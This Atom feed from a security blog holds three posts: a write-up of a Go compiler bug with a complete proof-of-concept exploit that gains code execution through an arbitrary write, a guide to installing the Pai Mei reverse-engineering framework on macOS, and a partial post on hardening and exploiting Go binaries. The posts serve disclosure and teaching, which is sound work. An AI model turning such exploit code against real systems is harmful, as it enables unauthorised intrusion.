<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>Code Arcana</title><link href="http://codearcana.com/" rel="alternate"></link><link href="http://codearcana.com/feeds/security.atom.xml" rel="self"></link><id>http://codearcana.com/</id><updated>2013-04-23T00:00:00-07:00</updated><entry><title>Exploiting a Go Binary</title><link href="http://codearcana.com/posts/2013/04/23/exploiting-a-go-binary.html" rel="alternate"></link><updated>2013-04-23T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-04-23:posts/2013/04/23/exploiting-a-go-binary.html</id><summary type="html">&lt;h3&gt;Introduction&lt;/h3&gt;

&lt;p&gt;Last night, tylerni7 showed us a proof of concept for a 32 bit Go exploit using &lt;a href="https://code.google.com/p/go/issues/detail?id=464"&gt;this issue&lt;/a&gt;. geohot and I had a wager over who could get the first remote code execution on &lt;a href="http://play.golang.org"&gt;play.golang.org&lt;/a&gt;: he won, but just barely ;-). Props also to ricky for help finding the underlying cause and updating the exploit for Go 1.03. Here is a summary of how we did it.&lt;/p&gt;
&lt;h3&gt;The Bug&lt;/h3&gt;

&lt;p&gt;Go has support for embedded structs. You can define an embedded struct as follows:&lt;/p&gt;

&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Embedded&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="nx"&gt;foo&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Struct&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="nx"&gt;Embedded&lt;/span&gt;
   &lt;span class="nx"&gt;bar&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;instance&lt;/span&gt; &lt;span class="nx"&gt;Struct&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;
It is valid to do both &lt;tt&gt;instance.bar&lt;/tt&gt; and &lt;tt&gt;instance.foo&lt;/tt&gt;.&lt;/p&gt;

&lt;p&gt;The problem comes when you try something slightly trickier:&lt;/p&gt;

&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Embedded&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="nx"&gt;foo&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Struct&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nx"&gt;Embedded&lt;/span&gt;
   &lt;span class="nx"&gt;bar&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;instance&lt;/span&gt; &lt;span class="nx"&gt;Struct&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;
When you access &lt;tt&gt;instance.foo&lt;/tt&gt; (a member of an uninitialized struct), it incorrectly offsets from 0 rather than from the base of an &lt;tt&gt;Embedded&lt;/tt&gt; struct. Normally, when dereferencing a pointer inside a struct, the go compiler
emits guard code which will cause a segfault if the pointer is nil.
However, this code is not emitted when the pointer is the first element
of the struct, since it's assumed that this will cause a segfault
whenever it is used anyway.  This assumption is not always valid, as the
pointer can be to a large struct such that the offsets of members of the large
struct are valid addresses.
&lt;/p&gt;

&lt;h3&gt;The Vulnerability&lt;/h3&gt;

&lt;p&gt;We define an enormous struct and use it to offset memory:&lt;/p&gt;

&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Embedded&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="nx"&gt;offset&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x400100&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="kt"&gt;byte&lt;/span&gt;
   &lt;span class="nx"&gt;address&lt;/span&gt; &lt;span class="kt"&gt;uint32&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Struct&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nx"&gt;Embedded&lt;/span&gt;
   &lt;span class="nx"&gt;bar&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;instance&lt;/span&gt; &lt;span class="nx"&gt;Struct&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;
Now we can do &lt;tt&gt;instance.address = 0xdeadbeef&lt;/tt&gt; and we have written to &lt;tt&gt;0x400100&lt;/tt&gt;! This is the arbitrary write primitive we need.&lt;/p&gt;

&lt;h3&gt;The Exploit&lt;/h3&gt;

&lt;p&gt;Once you have an arbitrary write in go, it is &lt;em&gt;really easy&lt;/em&gt; to get arbitrary code execution. We put a function pointer in our data segment (we wanted to put it in the heap, but that didn't work on 64bit Go - apparently the size of a struct is limited to 32 bits. Luckily, the data segment is in the lower 32 bits) and change it to point to our shell code using the arbitrary write. Since Go has &lt;em&gt;no randomization&lt;/em&gt; at all, this is as simple as running the program twice. Full exploit below:&lt;/p&gt;

&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="kn"&gt;package&lt;/span&gt; &lt;span class="nx"&gt;main&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;fmt&amp;quot;&lt;/span&gt;

&lt;span class="c1"&gt;// Address to write, computed from a previous run.&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;addr_to_overwrite&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x50e2f0&lt;/span&gt;
&lt;span class="c1"&gt;// &amp;amp;shellcode, computed from a previous run.&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;val_to_overwrite&lt;/span&gt; &lt;span class="kt"&gt;uint64&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0xc200035160&lt;/span&gt;

&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Embedded&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="nx"&gt;offset&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;addr_to_overwrite&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="kt"&gt;byte&lt;/span&gt;
   &lt;span class="nx"&gt;payload&lt;/span&gt; &lt;span class="kt"&gt;uint64&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Nested&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="c1"&gt;// This magic is necessary is because there is an explict null check if&lt;/span&gt;
  &lt;span class="c1"&gt;// if the offset is greater than 0x1000.&lt;/span&gt;
  &lt;span class="nx"&gt;Embedded&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Struct&lt;/span&gt; &lt;span class="kd"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
 &lt;span class="c1"&gt;// The issue is that a reference to the embeded struct pointer here&lt;/span&gt;
 &lt;span class="c1"&gt;// will be offset from null (rather than the true base of the struct).&lt;/span&gt;
 &lt;span class="c1"&gt;// We thus just make sizeof(the embedded struct) large enough to point&lt;/span&gt;
 &lt;span class="c1"&gt;// to the address we want to overwrite.&lt;/span&gt;
 &lt;span class="c1"&gt;//&lt;/span&gt;
 &lt;span class="c1"&gt;// See https://code.google.com/p/go/issues/detail?id=464&lt;/span&gt;
 &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nx"&gt;Nested&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;unused&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;func&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{}&lt;/span&gt;

&lt;span class="kd"&gt;func&lt;/span&gt; &lt;span class="nx"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
 &lt;span class="nx"&gt;s&lt;/span&gt; &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;Struct&lt;/span&gt;&lt;span class="p"&gt;{}&lt;/span&gt;
 &lt;span class="nx"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;\x90\x90\x90\x90\x90\x90\x90\xeb\xfe&amp;quot;&lt;/span&gt;

 &lt;span class="nx"&gt;fmt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;You should overwrite this: &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;unused&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;span class="nx"&gt;fmt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;With this: &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

 &lt;span class="nx"&gt;fmt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;***********************************************&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
 &lt;span class="nx"&gt;fmt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Overwriting &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;s&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot; with &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;val_to_overwrite&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

 &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;s&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;val_to_overwrite&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

 &lt;span class="nx"&gt;unused&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;What Now?&lt;/h3&gt;

&lt;p&gt;Well, clearly the &lt;a href="https://code.google.com/p/go/issues/detail?id=464"&gt;issue&lt;/a&gt; should be fixed (it was closed 3 years ago as "working as intended"). I also think it is important for Go to add the protections that come now standard with C binaries (ASLR, NX) - I posted &lt;a href="http://ppp.cylab.cmu.edu/wordpress/?p=667"&gt;an article&lt;/a&gt; earlier about security in Go where I strongly advocated those protections. Luckily, Go 1.1. will be adding some of these protections: specificially, the above exploit will not work because &lt;a href="https://groups.google.com/forum/?fromgroups=#!topic/golang-nuts/o2Q5oc36Qt0"&gt;Go 1.1  uses a non-executable heap and stack&lt;/a&gt; (the vulnerability still works to give an arbitrary write, but more care is necessary to complete the exploit). The development and release versions (as of time of this writing) are still vulnerable, but good job Go!&lt;/p&gt;</summary><category term="golang"></category><category term="exploitation"></category></entry><entry><title>Pai Mei on Mac OSX 10.8</title><link href="http://codearcana.com/posts/2012/10/28/pai-mei-on-mac-osx-108.html" rel="alternate"></link><updated>2012-10-28T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2012-10-28:posts/2012/10/28/pai-mei-on-mac-osx-108.html</id><summary type="html">&lt;p&gt;&lt;a href="https://github.com/OpenRCE/paimei"&gt;Pai Mei&lt;/a&gt; is an open source windows reverse engineering framework. At one point, it was ported to Mac OSX but the project is not very actively maintained and the current instructions are quite lacking. This post hopes to offer some guidance and reduce some of the frustration involved in installing Pai Mei on Mac OSX.&lt;/p&gt;
&lt;h3&gt;Getting the libraries&lt;/h3&gt;

&lt;p&gt;The most difficult thing was finding how to get all the packages working. First and foremost, Pai Mei was designed for a 32 bit windows libary so some trickery is required to get it to work in 64 bit mode (which is necessary, because I could not get the latest &lt;tt&gt;wxPython&lt;/tt&gt; from Homebrew to work in 32 bit mode). I did not realize at first that there was a way to use Pai Mei in 64 bit mode, so I spent a long time attempting to find universal binaries for wxPython and MySql.&lt;/p&gt;
&lt;p&gt;Pai Mei depends on a number of packages:
&lt;ul&gt;
    &lt;li&gt;&lt;tt&gt;mysql-python&lt;/tt&gt;: I installed via &lt;tt&gt;pip install mysql-python&lt;/tt&gt;.&lt;/li&gt;
    &lt;li&gt;&lt;tt&gt;pydasm&lt;/tt&gt;: I installed via &lt;tt&gt;pip install pydasm&lt;/tt&gt;.&lt;/li&gt;
        &lt;li&gt;&lt;tt&gt;ctypes&lt;/tt&gt;: I believe is included by default in Python 2.5 and higher.&lt;/li&gt;
        &lt;li&gt;&lt;tt&gt;MySql&lt;/tt&gt;: I installed via &lt;tt&gt;brew install mysql --universal&lt;/tt&gt; to have a universal binary (downloading from the MySql homepage means you will get a single architecture binary).&lt;/li&gt;
        &lt;li&gt;&lt;tt&gt;wxPython&lt;/tt&gt;: I installed via &lt;tt&gt;brew install wxmac --universal&lt;/tt&gt; and then manually symlinked it into correct location: &lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/Cellar/wxmac/2.9.4.0/lib/python2.7/site-packages/wx /Library/Python/2.7/site-packages/wx
&lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/Cellar/wxmac/2.9.4.0/lib/python2.7/site-packages/wxPython-2.9.4.0-py2.7.egg-info /Library/Python/2.7/site-packages/wxPython-2.9.4.0-py2.7.egg-info
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;(I sincerely hope there is a better way, but I couldn't find one). Note: as of yet, I haven't found a way to get &lt;tt&gt;wxPython&lt;/tt&gt; to work in 32 bit python. I'll update the post when I figure that out.&lt;/li&gt;
&lt;/ul&gt;&lt;/p&gt;
&lt;h3&gt;Installing Pai Mei&lt;/h3&gt;

&lt;p&gt;Pai Mei uses the &lt;a href="https://github.com/OpenRCE/pydbg"&gt;pydbg&lt;/a&gt; library (I believe it is linked incorrectly in the repository as a git submodule). I strongly encourage you &lt;a href="https://github.com/gdbinit/pydbg64"&gt;this&lt;/a&gt; version of pydbg instead, which is a port to 64 Mac OSX by Charlie Miller and fG. Cloning the repository and installing via instructions in the &lt;tt&gt;MacOSX/README&lt;/tt&gt; worked fine for me. Warning: you can only use this library to debug a 32 bit process from 32 bit python and a 64 bit process from 64 bit python: to use 32 bit python, do: &lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nv"&gt;VERSIONER_PYTHON_PREFER_32_BIT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;yes /usr/bin/python
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;After installing &lt;tt&gt;pydbg64&lt;/tt&gt;, I now had a directory tree that looked like:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="go"&gt;pydbg64/&lt;/span&gt;
&lt;span class="go"&gt;├── pydbg&lt;/span&gt;
&lt;span class="go"&gt;└── ...&lt;/span&gt;
&lt;span class="go"&gt;paimei/&lt;/span&gt;
&lt;span class="go"&gt;├── pgraph&lt;/span&gt;
&lt;span class="go"&gt;├── pida&lt;/span&gt;
&lt;span class="go"&gt;├── pydbg&lt;/span&gt;
&lt;span class="go"&gt;├── utils&lt;/span&gt;
&lt;span class="go"&gt;└── ...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;I deleted the &lt;tt&gt;paimei/pydbg&lt;/tt&gt; directory and added a symlink to the &lt;tt&gt;pydbg64/pydbg&lt;/tt&gt; directory, then  copied the fat &lt;tt&gt;libmacdll.dylib&lt;/tt&gt; from &lt;tt&gt;pydbg64/pydbg/libmacdll.dylib&lt;/tt&gt; to &lt;tt&gt;paimei/utils&lt;/tt&gt;. This left a directory that looked like this:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="go"&gt;pydbg64/&lt;/span&gt;
&lt;span class="go"&gt;├── pydbg&lt;/span&gt;
&lt;span class="go"&gt;└── ...&lt;/span&gt;
&lt;span class="go"&gt;paimei/&lt;/span&gt;
&lt;span class="go"&gt;├── pgraph&lt;/span&gt;
&lt;span class="go"&gt;├── pida&lt;/span&gt;
&lt;span class="go"&gt;├── pydbg -&amp;gt; ../pydbg64/pydbg&lt;/span&gt;
&lt;span class="go"&gt;├── utils&lt;/span&gt;
&lt;span class="go"&gt;│   ├── libmacdll.dylib&lt;/span&gt;
&lt;span class="go"&gt;│   └── ...&lt;/span&gt;
&lt;span class="go"&gt;└── ...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We now need to install all the Pai Mei packages (&lt;tt&gt;utils&lt;/tt&gt;, &lt;tt&gt;pida&lt;/tt&gt;, &lt;tt&gt;pgraph&lt;/tt&gt;) into the correct place so python can find them.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/paimei/pida /Library/Python/2.7/site-packages/pida
&lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/paimei/pgraph /Library/Python/2.7/site-packages/pgraph
&lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/paimei/utils /Library/Python/2.7/site-packages/utils
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Running Pai Mei&lt;/h3&gt;

&lt;p&gt;Before we can run Pai Mei, we must initialize the database: &lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; python /usr/local/paimei/__setup_mysql.py localhost root rootpassword
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Next, we have to patch a few bugs in Pai Mei (it calls a deprecated function and the MySql modal tries to helpfully destroy itself after successfully connecting to the database, but unfortunately does so before Python is completely done with it).&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gh"&gt;diff --git a/console/PAIMEIconsole.pyw b/console/PAIMEIconsole.pyw&lt;/span&gt;
&lt;span class="gh"&gt;index a45cbbf..0fea2ae 100644&lt;/span&gt;
&lt;span class="gd"&gt;--- a/console/PAIMEIconsole.pyw&lt;/span&gt;
&lt;span class="gi"&gt;+++ b/console/PAIMEIconsole.pyw&lt;/span&gt;
&lt;span class="gu"&gt;@@ -82,7 +82,7 @@ class PAIMEIapp (wx.App):&lt;/span&gt;
     &amp;#39;&amp;#39;&amp;#39;

     def OnInit (self):
&lt;span class="gd"&gt;-        wx.InitAllImageHandlers()&lt;/span&gt;
&lt;span class="gi"&gt;+#        wx.InitAllImageHandlers()&lt;/span&gt;

         splash = PAIMEIsplash()
         splash.Show()
&lt;span class="gh"&gt;diff --git a/console/support/mysql_connect_dialog.py b/console/support/mysql_connect&lt;/span&gt;
&lt;span class="gh"&gt;index 2201521..b641e37 100644&lt;/span&gt;
&lt;span class="gd"&gt;--- a/console/support/mysql_connect_dialog.py&lt;/span&gt;
&lt;span class="gi"&gt;+++ b/console/support/mysql_connect_dialog.py&lt;/span&gt;
&lt;span class="gu"&gt;@@ -104,7 +104,7 @@ class mysql_connect_dialog(wx.Dialog):&lt;/span&gt;
         self.parent.mysql_password = password

         self.mysql_connect(host, username, password)
&lt;span class="gd"&gt;-        self.Destroy()&lt;/span&gt;
&lt;span class="gi"&gt;+#       self.Destroy()&lt;/span&gt;

     def mysql_connect (self, host, username, password):
         try:
&lt;span class="gh"&gt;diff --git a/utils/process_stalker.py b/utils/process_stalker.py&lt;/span&gt;
&lt;span class="gh"&gt;index 987eec9..32206e4 100644&lt;/span&gt;
&lt;span class="gd"&gt;--- a/utils/process_stalker.py&lt;/span&gt;
&lt;span class="gi"&gt;+++ b/utils/process_stalker.py&lt;/span&gt;
&lt;span class="gu"&gt;@@ -281,11 +283,15 @@ class process_stalker:&lt;/span&gt;
                                 continue

                         basic_blocks.append(bb.ea_start)

                 if last_dll: self.log(&amp;quot;Setting %d breakpoints on basic blocks in %s
                 else:        self.log(&amp;quot;Setting %d breakpoints on basic blocks in ma

&lt;span class="gd"&gt;-                self.pydbg.bp_set(basic_blocks, restore=self.restore)&lt;/span&gt;
&lt;span class="gi"&gt;+                for block in basic_blocks:&lt;/span&gt;
&lt;span class="gi"&gt;+                       self.pydbg.bp_set(block, restore=self.restore)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now, we must make sure that python has the appropriate permisisons to monitor other processes before we can use Pai Mei. Unfortunately, this is not so easy anymore - since Snow Leopard, processes must be code signed in order to escalate privileges (a good writeup &lt;a href="http://os-tres.net/blog/2010/02/17/mac-os-x-and-task-for-pid-mach-call/"&gt;here&lt;/a&gt;). We could possibly patch pydbg to ask for permissions and sign it to work or disabling some system wide setting, but for now we will just run Pai Mei as root.&lt;/p&gt;
&lt;p&gt;A last disclaimer: the process stalker uses the name of the executable to find which pida module to load. Unfortunately, it truncates the process name, striping the directory, but insists that the name matches the full path to the pida module. I managed to hard code it to just always use the first pida module, but I don't know what the correct solution is. &lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gh"&gt;diff --git a/console/modules/_PAIMEIpstalker/ProcessListCtrl.py b/console/modules/_PAIMEIpstalker/ProcessListCtrl.py&lt;/span&gt;
&lt;span class="gh"&gt;index b37bd01..63880e3 100644&lt;/span&gt;
&lt;span class="gd"&gt;--- a/console/modules/_PAIMEIpstalker/ProcessListCtrl.py&lt;/span&gt;
&lt;span class="gi"&gt;+++ b/console/modules/_PAIMEIpstalker/ProcessListCtrl.py&lt;/span&gt;
&lt;span class="gu"&gt;@@ -166,7 +166,7 @@ class ProcessListCtrl (wx.ListCtrl, ListCtrlAutoWidthMixin, ColumnSorterMixin):&lt;/span&gt;
             heavy               = self.top.heavy.GetValue(),                \
             ignore_first_chance = self.top.ignore_first_chance.GetValue(),  \
             log                 = self.top.msg,                             \
&lt;span class="gd"&gt;-            main                = main,                                     \&lt;/span&gt;
&lt;span class="gi"&gt;+            main                = self.top.pida_modules.keys()[0],          \&lt;/span&gt;
             mysql               = self.top.main_frame.mysql,                \
             pida_modules        = self.top.pida_modules,                    \
             pydbg               = dbg,                                      \
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;After all this, I finally got Pai Mei (barely) working but I suspect I would have had an easier time and more fun just writing it myself ;-)&lt;/p&gt;</summary><category term="mac osx"></category><category term="reverse engineering"></category></entry><entry><title>Securing and Exploiting Go Binaries</title><link href="http://codearcana.com/posts/2012/05/06/securing-and-exploiting-go-binaries.html" rel="alternate"></link><updated>2012-05-06T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2012-05-06:posts/2012/05/06/securing-and-exploiting-go-binaries.html</id><summary type="html">&lt;h3&gt;Introduction&lt;/h3&gt;

&lt;p&gt;
First, I have been working in Go for about a year now. As part of this years pCTF, I created a problem that involved exploiting a Go binary (binary and source &lt;a href="http://ppp.cylab.cmu.edu/wordpress/wp-content/uploads/2012/05/bunyan-wp.tar.gz"&gt;here&lt;/a&gt;). I consequently had to deal with securing the binary to prevent leaking unnecessary information and had some fun playing around with exploiting a Go binary.
&lt;/p&gt;

&lt;h3&gt;Securing a Go Binary&lt;/h3&gt;

&lt;p&gt;
Creating a secure, production-ready Go binary was more challenging than expected. By default: &lt;ul&gt;
    &lt;li&gt;The Go build tools include the full path to the source on the build machine in the binary. &lt;/li&gt;
    &lt;li&gt;Go binaries helpfully print the faulting address and instruction on segmentation faults.&lt;/li&gt;
    &lt;li&gt;The heap in Go is loaded at a fixed address and is executable.&lt;/li&gt;
    &lt;li&gt;Go binaries are linked with full debug information.&lt;/li&gt;
&lt;/ul&gt;
I filed a &lt;a href="http://code.google.com/p/go/issues/detail?id=3467"&gt;issue&lt;/a&gt; suggesting the option for a compiler flag to create a hardended binary, but there has not been much interest in that yet.
&lt;/p&gt;

&lt;p&gt;
Some of these problems can be mitigated with appropriate hacks. The path to the Go runtime can be changed by setting the environment variable &lt;tt&gt;GOROOT_FINAL&lt;/tt&gt; before running &lt;tt&gt;all.bash&lt;/tt&gt; (see &lt;a href="http://code.google.com/p/go/issues/detail?id=3467#c4"&gt;this comment&lt;/a&gt; on the issue I filed). For user code, it takes some more work: I had to deep copy all of my source into a &lt;tt&gt;/tmp/build&lt;/tt&gt; directory before compiling so that the only string was a &lt;tt&gt;"/tmp/build"&lt;/tt&gt; rather than the actual path.
&lt;/p&gt;

&lt;p&gt;
Some debug information can be stripped by passing &lt;tt&gt;-s&lt;/tt&gt; as a command line to the linker (for example, &lt;tt&gt;go build -ldflags "-s" prog.go&lt;/tt&gt;). Note that this does not remove file paths, etc from the binary. It is pretty easy to patch the Go runtime to avoid printing the faulting address and instruction, but that should probably take the form of a real change rather than a quick and dirty patch. Unfortunately, the heap to be seems executable and loaded into fixed location by design (so that closures are easier and that heap addresses do not overlap with valid unicode strings, making the garbage collector easier), so it is not clear that that will be fixed for anytime soon.
&lt;/p&gt;

&lt;h3&gt;Exploiting a Go program&lt;/h3&gt;

&lt;h4&gt;Disclaimer&lt;/h4&gt;

&lt;p&gt;
First things first - I did &lt;em&gt;not&lt;/em&gt; find an exploit in the Go runtime that gave code execution. Instead, I linked the Go binary to a cgo library that had an intentional vulnerability. I had to do some work to make the cgo library exploitable. I made an explicitly vulnerabile C program and specified flags &lt;tt&gt;-fno-stack-protector -U_FORTIFY_SOURCE&lt;/tt&gt; to discard modern protections. Lastly, the behavior I performed in cgo (printing a string to stdout) could have trivially been perfomed in pure Go.
&lt;/p&gt;

&lt;p&gt;
However, I personally feel like Go packages use the unsafe package or are linked against full C libraries commonly enough (consider banthars &lt;a href="https://github.com/banthar/gl"&gt;package&lt;/a&gt; with Go bindings for OpenGl or a &lt;a href="http://go-lang.cat-v.org/library-bindings"&gt;variety&lt;/a&gt; of other packages) that it is irresponsible for the Go runtime to be poorly secured out of the claim that there are no vulnerabilies in Go. Furthermore, the Go runtime should be better secured to avoid the damage from any as of yet undiscovered vulnerabilities in the Go runtime.
&lt;/p&gt;

&lt;p&gt;
Going forward, I will assume that there is a vulnerability (introduced possibly by a vulnerable C library) and will focus on one interesting way to exploit it by using the Go runtime. I will specifically focus on the &lt;a href="webapp"&gt;&lt;tt&gt;webapp&lt;/tt&gt;&lt;/a&gt; problem used in pCTF.
&lt;/p&gt;

&lt;h4&gt;The actual exploit&lt;/h4&gt;

&lt;p&gt;
The Go runtime has some really interesting properties that make it fun to exploit:
&lt;ul&gt;
    &lt;li&gt;The heap is executable.&lt;/li&gt;
    &lt;li&gt;The heap is deterministic and in a fixed location every run&lt;/li&gt;
    &lt;li&gt;Immutable strings tend to end up on the heap&lt;/li&gt;
&lt;/ul&gt;
